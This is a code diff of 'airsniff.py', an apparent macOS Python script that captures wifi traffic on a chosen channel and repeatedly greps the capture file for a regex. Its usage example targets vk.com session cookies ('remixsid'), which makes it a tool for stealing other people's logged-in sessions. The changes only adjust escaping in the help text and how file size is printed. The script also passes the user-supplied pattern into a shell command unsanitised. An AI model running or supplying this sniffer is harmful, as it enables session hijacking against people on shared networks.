@@ -10,10 +10,10 @@ import time
 if len(sys.argv) == 1:
 	print('''
 ------------------
-Usage: airsniff.py <channel> <\"pattern\">
+Usage: airsniff.py <channel> <\\"pattern\\">
 <channell> - wifi channel
-<\"pattern\"> - regexp that will grep /tmp/*.cap file. Quotes and backslashes required!
-Example for vk.com: airsniff.py 10 \"remixsid=[a-z0-9]{68}"\
+<\\"pattern\\"> - regexp that will grep /tmp/*.cap file. Quotes and backslashes required!
+Example for vk.com: airsniff.py 10 \\"remixsid=[a-z0-9]{68}\\"
 ''')
 	sys.exit();
 
@@ -51,11 +51,13 @@ if (AirportObj.poll() != None):
 	print "\nError!\nTry run /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en1 scan" 
 	sys.exit()
 
+file_path = glob.glob('/tmp/*.cap')[0]
+print "Dump file path " + file_path
+
 print "Now run in loop:  grep -aEo " + pattern + " /tmp/*.cap"
 print "Press Ctrl+C to abort."
 while True:
-	lsObj = subprocess.call("echo 'Dump size: '; ls -lah /tmp/*.cap | awk '{print $5}'", shell=True)
-	print ''
+	print "File size: " + str(os.path.getsize(file_path)/1000) + " KB"
 	GrepObj = subprocess.call('grep -aEo %s /tmp/*.cap' % pattern, shell=True)
 #	GrepObj = subprocess.Popen(['grep','-aEo', pattern, '/tmp/*.cap'], stdout=subprocess.PIPE)
 #	matches = GrepObj.stdout.read()
